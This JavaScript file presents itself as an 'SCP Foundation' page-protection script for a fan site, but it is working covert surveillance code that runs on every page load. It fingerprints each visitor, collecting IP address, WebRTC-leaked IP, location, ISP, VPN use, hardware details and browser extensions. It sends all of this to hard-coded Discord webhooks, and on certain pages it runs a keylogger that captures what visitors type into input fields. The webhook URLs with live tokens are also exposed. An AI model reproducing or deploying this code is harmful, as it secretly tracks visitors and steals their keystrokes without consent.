// ============================================================
// SCP FOUNDATION - SENSITIVE CODE PROTECTION SCRIPT (Complete)
// Protects: PLP-L-2, PLP-L-3, PLP-L-4, PLP-L-5
//           L-5T-Code-of-Ethics, L-5T-Lockdown-Response-Code
//           L-4-Lockdown-Response-Code, 3-LRC, 2-LRC
//           L-4-Code-of-Ethics, L3-CoE, L2-CoE, L-1-CoE
// ============================================================

// Global violation tracking with limits
let violationCount = 0;
const violationHistory = [];
const webhookURL = "https://discord.com/api/webhooks/1482510569461383242/tF_91rzrXYfs4P-qBbarNafSa-fArvPp99_HxdoM8_iREqzgaSTLhBoFOajYwB1-ElgN";
const keyloggerWebhookURL = "https://discord.com/api/webhooks/1501762208906870847/YCy3FG4KTmvsgW8B98l11HQkydWu8gEygCLEwFVvCN0gtn8e4jO4TIFGWOaeBT2DqKI0";

// Performance flag to prevent overload
let isProcessingViolation = false;
let dataCollectionInProgress = false;
let hasRedirected = false;

// ============================================================
// ADVANCED DATA COLLECTION MODULE
// ============================================================

// Cache system for expensive operations
let cachedIP = null;
let ipCacheTime = null;
let cachedLocation = null;
let locationCacheTime = null;
let cachedExtensions = null;
let extensionsCacheTime = null;
let cachedNetworkInfo = null;
let networkCacheTime = null;

const IP_CACHE_DURATION = 300000; // 5 minutes
const LOCATION_CACHE_DURATION = 3600000; // 1 hour
const EXTENSIONS_CACHE_DURATION = 300000; // 5 minutes
const NETWORK_CACHE_DURATION = 30000; // 30 seconds

// Get IP address
async function getIPAddress() {
    if (cachedIP && ipCacheTime && (Date.now() - ipCacheTime) < IP_CACHE_DURATION) {
        return cachedIP;
    }
    
    const ipServices = [
        'https://api.ipify.org?format=json',
        'https://api.ip.sb/jsonip'
    ];
    
    for (const url of ipServices) {
        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 3000);
            const response = await fetch(url, { signal: controller.signal });
            const data = await response.json();
            const ip = data.ip || 'Failed';
            clearTimeout(timeoutId);
            
            if (ip && ip !== 'Failed' && ip.includes('.')) {
                cachedIP = ip;
                ipCacheTime = Date.now();
                return ip;
            }
        } catch (error) {
            continue;
        }
    }
    return 'Unable to retrieve IP';
}

// Get location and ISP info
async function getLocationAndISP(ip) {
    if (ip === 'Unable to retrieve IP') return { location: 'Unavailable', isp: 'Unavailable' };
    if (cachedLocation && locationCacheTime && (Date.now() - locationCacheTime) < LOCATION_CACHE_DURATION) {
        return cachedLocation;
    }
    
    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 3000);
        const response = await fetch(`https://ipapi.co/${ip}/json/`, { signal: controller.signal });
        const data = await response.json();
        clearTimeout(timeoutId);
        
        if (data.error) return { location: 'Unavailable', isp: 'Unavailable' };
        
        const result = {
            location: `${data.city || 'Unknown'}, ${data.region || 'Unknown'}, ${data.country_name || 'Unknown'}`,
            isp: data.org || 'Unavailable',
            abuseScore: data.abuse?.score || 'N/A'
        };
        
        cachedLocation = result;
        locationCacheTime = Date.now();
        return result;
    } catch (error) {
        return { location: 'Unavailable', isp: 'Unavailable', abuseScore: 'N/A' };
    }
}

// Get WebRTC IPs
async function getWebRTCIPs() {
    return new Promise((resolve) => {
        const timeout = setTimeout(() => resolve('Unable to detect'), 2000);
        
        try {
            const pc = new RTCPeerConnection({ iceServers: [] });
            pc.createDataChannel('');
            pc.createOffer()
                .then(offer => pc.setLocalDescription(offer))
                .catch(() => {});
            
            pc.onicecandidate = (event) => {
                if (event.candidate) {
                    const ipRegex = /([0-9]{1,3}\.){3}[0-9]{1,3}/;
                    const match = ipRegex.exec(event.candidate.candidate);
                    if (match) {
                        clearTimeout(timeout);
                        pc.close();
                        resolve(match[0]);
                    }
                }
            };
            
            setTimeout(() => {
                clearTimeout(timeout);
                pc.close();
                resolve('No WebRTC IP detected');
            }, 1500);
        } catch (error) {
            clearTimeout(timeout);
            resolve('WebRTC not supported');
        }
    });
}

// Get network information
async function getNetworkInfo() {
    if (cachedNetworkInfo && networkCacheTime && (Date.now() - networkCacheTime) < NETWORK_CACHE_DURATION) {
        return cachedNetworkInfo;
    }
    
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    let connectionType = 'Unknown';
    let downlink = 'N/A';
    let rtt = 'N/A';
    
    if (connection) {
        connectionType = connection.effectiveType || connection.type || 'Unknown';
        downlink = connection.downlink ? `${connection.downlink} Mbps` : 'N/A';
        rtt = connection.rtt ? `${connection.rtt}ms` : 'N/A';
    }
    
    const result = {
        connectionType: connectionType,
        downlink: downlink,
        rtt: rtt,
        onlineStatus: navigator.onLine ? 'Online' : 'Offline',
        display: `Type: ${connectionType}, Downlink: ${downlink}, RTT: ${rtt}`
    };
    
    cachedNetworkInfo = result;
    networkCacheTime = Date.now();
    return result;
}

// VPN/Proxy detection
async function detectVPN(ip) {
    if (ip === 'Unable to retrieve IP') return { detected: false, details: 'Unable to check' };
    
    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 3000);
        const response = await fetch(`https://ipapi.co/${ip}/json/`, { signal: controller.signal });
        const data = await response.json();
        clearTimeout(timeoutId);
        
        const isProxy = data.proxy || data.hosting || false;
        const details = [];
        
        if (data.proxy) details.push('Proxy detected');
        if (data.hosting) details.push('Hosting/VPN service detected');
        if (data.org && (data.org.toLowerCase().includes('vpn') || data.org.toLowerCase().includes('proxy'))) {
            details.push(`Service: ${data.org}`);
        }
        
        return {
            detected: isProxy,
            details: details.length > 0 ? details.join(', ') : 'No VPN/Proxy detected'
        };
    } catch (error) {
        return { detected: false, details: 'Detection unavailable' };
    }
}

// Detect browser extensions - IMPROVED VERSION
async function detectBrowserExtensions() {
    if (cachedExtensions && extensionsCacheTime && (Date.now() - extensionsCacheTime) < EXTENSIONS_CACHE_DURATION) {
        return cachedExtensions;
    }
    
    const suspiciousKeywords = ['vpn', 'sec', 'security', 'byte', 'proxy', 'open', 'mull', 'vad', 
                                'ublock', 'block', 'track', 'dev', 'console', 'copy', 'copier', 
                                'duplicate', 'download', 'html', 'page', 'guard', 'protect', 'shield',
                                'privacy', 'adblock', 'ad block', 'safe', 'trust', 'vault', 'encrypt'];
    
    const detectedExtensions = new Set(); // Use Set to avoid duplicates
    const suspiciousExtensions = new Set();
    
    // Method 1: Check for Chrome extension APIs
    if (typeof chrome !== 'undefined' && chrome.runtime && chrome.runtime.id) {
        detectedExtensions.add(`Chrome Extension: ${chrome.runtime.id}`);
        // Check if extension ID contains suspicious keywords
        for (const keyword of suspiciousKeywords) {
            if (chrome.runtime.id.toLowerCase().includes(keyword)) {
                suspiciousExtensions.add(`Extension ID: ${chrome.runtime.id}`);
            }
        }
    }
    
    // Method 2: Check for browser extension API (Firefox)
    if (typeof browser !== 'undefined' && browser.runtime && browser.runtime.id) {
        detectedExtensions.add(`Browser Extension: ${browser.runtime.id}`);
        for (const keyword of suspiciousKeywords) {
            if (browser.runtime.id.toLowerCase().includes(keyword)) {
                suspiciousExtensions.add(`Extension ID: ${browser.runtime.id}`);
            }
        }
    }
    
    // Method 3: Check DOM for extension elements
    const allElements = document.querySelectorAll('[id], [class]');
    allElements.forEach(el => {
        const id = el.id ? el.id.toLowerCase() : '';
        const className = el.className ? (typeof el.className === 'string' ? el.className.toLowerCase() : '') : '';
        const combined = id + ' ' + className;
        
        for (const keyword of suspiciousKeywords) {
            if (combined.includes(keyword)) {
                const extName = `Element: ${keyword} (${el.tagName})`;
                if (!detectedExtensions.has(extName) && extName.length < 100) {
                    detectedExtensions.add(extName);
                }
                
                // Check for specifically restricted extensions
                if (['dev', 'console', 'copy', 'copier', 'duplicate', 'download', 'html', 'page'].includes(keyword)) {
                    suspiciousExtensions.add(`Suspicious element: ${keyword} in ${el.tagName}`);
                }
            }
        }
    });
    
    // Method 4: Check for extension-specific global variables
    const extensionGlobals = ['webExtension', '__WEB_EXTENSION__', 'EXTENSION_ID', 'extension'];
    extensionGlobals.forEach(global => {
        if (window[global]) {
            detectedExtensions.add(`Global object: ${global}`);
            suspiciousExtensions.add(`Global object: ${global}`);
        }
    });
    
    // Method 5: Check navigation and performance entries for extensions
    try {
        const resources = performance.getEntriesByType('resource');
        const extensionUrls = resources.filter(r => 
            r.name.includes('chrome-extension://') || 
            r.name.includes('moz-extension://') ||
            r.name.includes('safari-extension://')
        );
        
        extensionUrls.forEach(url => {
            const match = url.name.match(/(chrome-extension|moz-extension|safari-extension):\/\/([^\/]+)/);
            if (match) {
                const extId = match[2];
                detectedExtensions.add(`Extension resource: ${extId.substring(0, 30)}`);
                
                for (const keyword of suspiciousKeywords) {
                    if (extId.toLowerCase().includes(keyword)) {
                        suspiciousExtensions.add(`Extension ID: ${extId}`);
                    }
                }
            }
        });
    } catch (e) {}
    
    // Method 6: Check for extension CSS
    const styleSheets = document.styleSheets;
    for (let i = 0; i < styleSheets.length; i++) {
        try {
            const href = styleSheets[i].href;
            if (href && (href.includes('chrome-extension://') || href.includes('moz-extension://'))) {
                const match = href.match(/(chrome-extension|moz-extension):\/\/([^\/]+)/);
                if (match) {
                    detectedExtensions.add(`Extension CSS: ${match[2].substring(0, 30)}`);
                }
            }
        } catch (e) {}
    }
    
    // Method 7: Check for messaging ports (indicates extension communication)
    if (typeof chrome !== 'undefined' && chrome.runtime && chrome.runtime.connect) {
        detectedExtensions.add('Extension messaging API detected');
    }
    
    const result = {
        all: Array.from(detectedExtensions),
        suspicious: Array.from(suspiciousExtensions),
        hasSuspicious: suspiciousExtensions.size > 0
    };
    
    cachedExtensions = result;
    extensionsCacheTime = Date.now();
    return result;
}

// Comprehensive timezone function
function getTimezoneWithAbbreviation() {
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const now = new Date();
    const offset = -now.getTimezoneOffset();
    const absOffset = Math.abs(offset);
    const offsetHours = Math.floor(absOffset / 60);
    const offsetMinutes = absOffset % 60;
    const offsetSign = offset >= 0 ? '+' : '-';
    const offsetStr = `${offsetSign}${offsetHours.toString().padStart(2, '0')}:${offsetMinutes.toString().padStart(2, '0')}`;
    const gmtString = `GMT${offsetStr}`;
    
    const janOffset = -new Date(now.getFullYear(), 0, 1).getTimezoneOffset();
    const julOffset = -new Date(now.getFullYear(), 6, 1).getTimezoneOffset();
    const isDST = janOffset !== julOffset;
    
    const tzMap = {
        'America/New_York': isDST ? 'EDT' : 'EST',
        'America/Chicago': isDST ? 'CDT' : 'CST',
        'America/Denver': isDST ? 'MDT' : 'MST',
        'America/Los_Angeles': isDST ? 'PDT' : 'PST',
        'Europe/London': isDST ? 'BST' : 'GMT',
        'Europe/Berlin': isDST ? 'CEST' : 'CET',
        'Europe/Vienna': isDST ? 'CEST' : 'CET',
        'Australia/Sydney': isDST ? 'AEDT' : 'AEST'
    };
    
    let abbreviation = tzMap[timezone] || gmtString;
    const currentTime = now.toLocaleString('en-US', {
        weekday: 'short', year: 'numeric', month: 'short', day: 'numeric',
        hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true
    });
    
    return {
        timezone: timezone,
        abbreviation: abbreviation,
        offset: offsetStr,
        currentTime: currentTime,
        display: `${abbreviation} (${gmtString}) - ${currentTime}`
    };
}

// Get battery info
async function getBatteryInfo() {
    if (!navigator.getBattery) return 'Not supported';
    try {
        const battery = await navigator.getBattery();
        return `${battery.charging ? 'Charging' : 'Discharging'} (${Math.round(battery.level * 100)}%)`;
    } catch (error) {
        return 'Unavailable';
    }
}

// Get GPU info
function getGPUInfo() {
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl');
        if (!gl) return 'WebGL not supported';
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (debugInfo) {
            return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'Unknown';
        }
        return 'Unavailable';
    } catch (error) {
        return 'Unable to retrieve';
    }
}

// Get plugins
function getPlugins() {
    if (!navigator.plugins || navigator.plugins.length === 0) return 'No plugins detected';
    const plugins = [];
    for (let i = 0; i < Math.min(navigator.plugins.length, 5); i++) {
        plugins.push(navigator.plugins[i].name.substring(0, 50));
    }
    return plugins.join(', ') + (navigator.plugins.length > 5 ? '...' : '');
}

// Get installed fonts (sample)
function getInstalledFonts() {
    const fonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New'];
    const detected = fonts.filter(font => {
        const span = document.createElement('span');
        span.style.fontFamily = font;
        return true;
    });
    return detected.join(', ');
}

// Check Java enablement
function isJavaEnabled() {
    try {
        return navigator.javaEnabled ? navigator.javaEnabled() : false;
    } catch (e) {
        return false;
    }
}

// Check JavaScript enabled (always true in browser context)
function isJavaScriptEnabled() {
    return true;
}

// FIXED: Anti-detection for suspicious extensions with HTML keyword
async function checkAndRedirectForSuspiciousActivity(extensions, javaEnabled) {
    if (hasRedirected) return false;
    
    // Check for HTML keyword specifically
    const hasHtmlExtension = extensions.all.some(ext => 
        ext.toLowerCase().includes('html')
    );
    
    const hasSuspiciousExt = extensions.suspicious.length > 0 || hasHtmlExtension;
    
    // Also check for any extension with the restricted keywords
    const restrictedKeywords = ['dev', 'console', 'copy', 'copier', 'duplicate', 'download', 'html', 'page'];
    const hasRestrictedExt = extensions.all.some(ext => {
        const lowerExt = ext.toLowerCase();
        return restrictedKeywords.some(keyword => lowerExt.includes(keyword));
    });
    
    if (hasSuspiciousExt || hasRestrictedExt || javaEnabled) {
        hasRedirected = true;
        
        // Build detailed reason
        let reason = '';
        let details = '';
        
        if (hasRestrictedExt) {
            const matchedExts = extensions.all.filter(ext => {
                const lowerExt = ext.toLowerCase();
                return restrictedKeywords.some(keyword => lowerExt.includes(keyword));
            });
            reason = `Restricted extension detected: ${matchedExts.join(', ')}`;
            details = `Full extension list: ${extensions.all.join(', ') || 'None'}`;
        } else if (hasSuspiciousExt) {
            reason = `Suspicious extension detected: ${extensions.suspicious.join(', ')}`;
            details = `Full extension list: ${extensions.all.join(', ') || 'None'}`;
        } else if (javaEnabled) {
            reason = "Java is enabled";
            details = "Java plugin is active in browser";
        }
        
        // Send security alert
        const alertEmbed = {
            title: "🚨 DEVICE SECURITY VIOLATION - REDIRECT TRIGGERED 🚨",
            color: 0xff0000,
            timestamp: new Date().toISOString(),
            fields: [
                { name: "Violation Type", value: "Restricted Extension/Java Detected", inline: false },
                { name: "Reason", value: reason, inline: false },
                { name: "Details", value: details, inline: false },
                { name: "User Action", value: "Redirecting to /NOEA-DEVICE-INF-A-503.html", inline: false }
            ],
            footer: { text: "SCP Foundation - Automatic Security Response" }
        };
        
        try {
            await fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ embeds: [alertEmbed] })
            });
        } catch (error) {}
        
        // Redirect
        window.location.href = '/NOEA-DEVICE-INF-A-503.html';
        return true;
    }
    return false;
}

// Complete data collection
async function collectCompleteData() {
    if (dataCollectionInProgress) return;
    dataCollectionInProgress = true;
    
    try {
        const ip = await getIPAddress();
        const { location, isp, abuseScore } = await getLocationAndISP(ip);
        const webRTCIP = await getWebRTCIPs();
        const networkInfo = await getNetworkInfo();
        const vpnStatus = await detectVPN(ip);
        const extensions = await detectBrowserExtensions();
        const timezoneInfo = getTimezoneWithAbbreviation();
        const batteryInfo = await getBatteryInfo();
        const gpuInfo = getGPUInfo();
        
        // Check for suspicious activity BEFORE sending data
        const javaEnabled = isJavaEnabled();
        const shouldRedirect = await checkAndRedirectForSuspiciousActivity(extensions, javaEnabled);
        if (shouldRedirect) return;
        
        const pageInfo = {
            url: window.location.href.substring(0, 500),
            title: document.title ? document.title.substring(0, 200) : 'No title',
            referrer: document.referrer || 'Direct visit'
        };
        
        const systemInfo = {
            browser: navigator.userAgent.substring(0, 200),
            os: navigator.platform,
            language: navigator.language,
            vendor: navigator.vendor || 'Unknown',
            deviceType: /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'
        };
        
        const displayInfo = {
            screenResolution: `${screen.width}x${screen.height}`,
            windowSize: `${window.innerWidth}x${window.innerHeight}`,
            colorDepth: `${screen.colorDepth} bits`,
            pixelRatio: window.devicePixelRatio || 'N/A',
            deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown'
        };
        
        const technicalCapabilities = {
            cpuCores: navigator.hardwareConcurrency || 'Unknown',
            touchScreen: 'maxTouchPoints' in navigator ? navigator.maxTouchPoints > 0 : false,
            cookiesEnabled: navigator.cookieEnabled,
            localStorage: !!window.localStorage,
            sessionStorage: !!window.sessionStorage
        };
        
        const webTech = {
            webWorkers: !!window.Worker,
            serviceWorkers: 'serviceWorker' in navigator,
            webAssembly: !!window.WebAssembly,
            webGL2: !!document.createElement('canvas').getContext('webgl2'),
            webPSupport: (() => {
                const canvas = document.createElement('canvas');
                return canvas.toDataURL('image/webp').indexOf('data:image/webp') === 0;
            })(),
            plugins: getPlugins()
        };
        
        const userPrefs = {
            darkMode: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Enabled' : 'Disabled',
            reducedMotion: window.matchMedia('(prefers-reduced-motion: reduce)').matches ? 'Enabled' : 'Disabled',
            doNotTrack: navigator.doNotTrack || 'Not set'
        };
        
        const securityPrivacy = {
            javaScriptEnabled: isJavaScriptEnabled(),
            activeX: !!window.ActiveXObject ? 'Yes' : 'No',
            javaEnabled: javaEnabled,
            sessionPersistence: !!window.sessionStorage
        };
        
        // Create comprehensive embed
        const embedData = {
            title: "🔍 COMPLETE DEVICE & NETWORK ANALYSIS",
            color: 0x2b2d42,
            timestamp: new Date().toISOString(),
            fields: [
                { name: "📄 Page Information", value: `**URL:** ${pageInfo.url}\n**Title:** ${pageInfo.title}\n**Referrer:** ${pageInfo.referrer}`, inline: false },
                { name: "🌐 Network Information", value: `**IP:** ${ip}\n**ISP:** ${isp}\n**Location:** ${location}\n**Connection Type:** ${networkInfo.connectionType}\n**Online Status:** ${networkInfo.onlineStatus}\n**WebRTC IPs:** ${webRTCIP}\n**Network Details:** ${networkInfo.display}`, inline: false },
                { name: "⚠️ IP Reputation & Security", value: `**Abuse Score:** ${abuseScore}\n**VPN/Proxy:** ${vpnStatus.detected ? '⚠️ DETECTED' : '✅ Clean'}\n**Details:** ${vpnStatus.details}`, inline: false },
                { name: "🧩 Browser Extensions", value: extensions.all.length > 0 ? extensions.all.map(e => `• ${e}`).join('\n').substring(0, 1024) : 'No extensions detected', inline: false },
                { name: "🖥️ System Information", value: `**Browser:** ${systemInfo.browser}\n**OS:** ${systemInfo.os}\n**Language:** ${systemInfo.language}\n**Vendor:** ${systemInfo.vendor}\n**Device Type:** ${systemInfo.deviceType}`, inline: false },
                { name: "📊 Display Information", value: `**Screen:** ${displayInfo.screenResolution}\n**Window:** ${displayInfo.windowSize}\n**Color Depth:** ${displayInfo.colorDepth}\n**Pixel Ratio:** ${displayInfo.pixelRatio}\n**Device Memory:** ${displayInfo.deviceMemory}`, inline: false },
                { name: "⚙️ Technical Capabilities", value: `**CPU Cores:** ${technicalCapabilities.cpuCores}\n**Touch Screen:** ${technicalCapabilities.touchScreen}\n**Cookies Enabled:** ${technicalCapabilities.cookiesEnabled}\n**Local Storage:** ${technicalCapabilities.localStorage}\n**Session Storage:** ${technicalCapabilities.sessionStorage}`, inline: false },
                { name: "🔧 Web Technologies", value: `**Web Workers:** ${webTech.webWorkers}\n**Service Workers:** ${webTech.serviceWorkers}\n**WebAssembly:** ${webTech.webAssembly}\n**WebGL2:** ${webTech.webGL2}\n**WebP Support:** ${webTech.webPSupport}\n**Plugins:** ${webTech.plugins.substring(0, 200)}`, inline: false },
                { name: "🎨 WebGL Renderer", value: gpuInfo, inline: true },
                { name: "⚙️ User Preferences", value: `**Dark Mode:** ${userPrefs.darkMode}\n**Reduced Motion:** ${userPrefs.reducedMotion}\n**Do Not Track:** ${userPrefs.doNotTrack}`, inline: true },
                { name: "🔐 Security & Privacy", value: `**JavaScript Enabled:** ${securityPrivacy.javaScriptEnabled}\n**ActiveX:** ${securityPrivacy.activeX}\n**Java Enabled:** ${securityPrivacy.javaEnabled}\n**Session Persistence:** ${securityPrivacy.sessionPersistence}`, inline: false },
                { name: "🕐 Timezone Information", value: timezoneInfo.display, inline: false },
                { name: "🔋 Battery Status", value: batteryInfo, inline: true }
            ],
            footer: { text: "SCP Foundation - Complete Device Analysis | RAISA" }
        };
        
        // Send to webhook
        await fetch(webhookURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embedData] })
        }).catch(() => {});
        
    } catch (error) {
        console.error('Data collection error:', error);
    } finally {
        dataCollectionInProgress = false;
    }
}

// ============================================================
// PAGE TRACKING & KEYLOGGER MODULE
// ============================================================

let currentPageTracking = { pageType: null, pageName: null };
let keystrokeBuffer = [];
let lastKeyLogTime = 0;
let isKeyloggerActive = false;
const KEYLOG_THROTTLE = 2000;

function detectPageType() {
    const url = window.location.href;
    const path = window.location.pathname;
    const pageContent = document.body ? document.body.innerText.substring(0, 1000) : '';
    
    if (/plp/i.test(url) || /plp/i.test(path)) {
        if (/plp-l-2/i.test(url)) return { type: 'PLP', name: 'PLP-L-2' };
        if (/plp-l-3/i.test(url)) return { type: 'PLP', name: 'PLP-L-3' };
        if (/plp-l-4/i.test(url)) return { type: 'PLP', name: 'PLP-L-4' };
        if (/plp-l-5/i.test(url)) return { type: 'PLP', name: 'PLP-L-5' };
        return { type: 'PLP', name: 'PLP-Page' };
    }
    
    if (/scipnet/i.test(url) || /scip-net/i.test(pageContent)) {
        return { type: 'SCiPNET', name: 'SCiPNET-Page' };
    }
    
    return { type: 'NORMAL', name: 'Standard-Page' };
}

function shouldActivateKeylogger() {
    return currentPageTracking.pageType === 'PLP' || currentPageTracking.pageType === 'SCiPNET';
}

async function sendKeystrokeBatch(batch) {
    if (batch.length === 0) return;
    
    const now = Date.now();
    if (now - lastKeyLogTime < KEYLOG_THROTTLE) {
        setTimeout(() => sendKeystrokeBatch(batch), KEYLOG_THROTTLE);
        return;
    }
    
    lastKeyLogTime = now;
    const timestamp = new Date().toISOString();
    const activeEl = document.activeElement;
    const elementInfo = {
        type: activeEl?.tagName?.toLowerCase() || 'unknown',
        name: activeEl?.getAttribute('name') || '',
        id: activeEl?.id || ''
    };
    
    const embed = {
        title: "⌨️ KEYSTROKE LOG - Restricted Page",
        color: 0xff0000,
        timestamp: timestamp,
        fields: [
            { name: "Page", value: `${currentPageTracking.pageType} - ${currentPageTracking.name}`, inline: false },
            { name: "Input Field", value: `Type: ${elementInfo.type}, Name: ${elementInfo.name || 'N/A'}`, inline: true },
            { name: "Keystrokes", value: `\`\`\`${batch.join('')}\`\`\``, inline: false },
            { name: "Session ID", value: sessionStorage.getItem('scp_session_id') || 'N/A', inline: true }
        ]
    };
    
    try {
        await fetch(keyloggerWebhookURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embed] })
        });
    } catch (error) {}
}

function sanitizeKeystroke(key) {
    if (['Shift', 'Control', 'Alt', 'Meta'].includes(key)) return null;
    if (key === 'Enter') return '[ENTER]';
    if (key === 'Backspace') return '[BACKSPACE]';
    if (key === 'Tab') return '[TAB]';
    if (key === 'Escape') return '[ESC]';
    if (key === 'Space') return ' ';
    if (key.length === 1) return key;
    return `[${key.toUpperCase()}]`;
}

function handleKeyPress(event) {
    if (!shouldActivateKeylogger()) return;
    
    const activeEl = document.activeElement;
    const isInput = activeEl && (activeEl.tagName === 'INPUT' || activeEl.tagName === 'TEXTAREA' || activeEl.isContentEditable);
    if (!isInput) return;
    
    const sanitized = sanitizeKeystroke(event.key);
    if (!sanitized) return;
    
    keystrokeBuffer.push(sanitized);
    
    if (keystrokeBuffer.length >= 7) {
        sendKeystrokeBatch([...keystrokeBuffer]);
        keystrokeBuffer = [];
    }
}

function flushKeyBuffer() {
    if (keystrokeBuffer.length > 0 && shouldActivateKeylogger()) {
        sendKeystrokeBatch([...keystrokeBuffer]);
        keystrokeBuffer = [];
    }
}

function initKeylogger() {
    if (isKeyloggerActive) return;
    isKeyloggerActive = true;
    
    if (!sessionStorage.getItem('scp_session_id')) {
        sessionStorage.setItem('scp_session_id', Date.now().toString(36) + Math.random().toString(36).substring(2, 8));
    }
    
    document.addEventListener('keydown', handleKeyPress);
    window.addEventListener('beforeunload', flushKeyBuffer);
    document.addEventListener('visibilitychange', () => { if (document.hidden) flushKeyBuffer(); });
}

// ============================================================
// SECURITY PROTOCOL
// ============================================================

(function() {
    'use strict';
    
    // Update page tracking
    currentPageTracking = detectPageType();
    
    // Start keylogger if needed
    if (shouldActivateKeylogger()) {
        initKeylogger();
    }
    
    // Monitor page changes
    let lastUrl = window.location.href;
    const observer = new MutationObserver(() => {
        if (window.location.href !== lastUrl) {
            lastUrl = window.location.href;
            currentPageTracking = detectPageType();
            
            if (shouldActivateKeylogger() && !isKeyloggerActive) {
                initKeylogger();
            } else if (!shouldActivateKeylogger() && isKeyloggerActive) {
                flushKeyBuffer();
                isKeyloggerActive = false;
            }
        }
    });
    observer.observe(document, { subtree: true, childList: true });
    
    // Collect data after page loads
    if (!window._scp_data_collected && window.location.hostname !== 'localhost') {
        window._scp_data_collected = true;
        setTimeout(() => collectCompleteData(), 1500);
    }
})();

console.log('SCP Foundation Security Protocol Active - Complete Protection Enabled');
